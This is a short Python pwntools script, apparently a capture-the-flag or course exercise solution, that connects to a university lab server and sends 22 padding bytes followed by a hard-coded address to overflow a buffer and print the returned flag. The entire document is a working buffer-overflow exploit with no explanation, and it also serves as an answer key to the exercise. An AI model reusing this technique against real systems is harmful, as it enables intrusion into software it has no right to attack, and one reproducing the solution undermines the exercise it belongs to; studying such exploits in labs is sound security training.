import pwn

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23154

remote = pwn.remote(SERVER, PORT, timeout=10000)

buffer = str.encode("a" * 22) + bytes.fromhex("f1860408")

remote.recvline()
remote.sendline(buffer)
flag = remote.recvline_contains(b"Flag")
print(flag.decode().split()[1])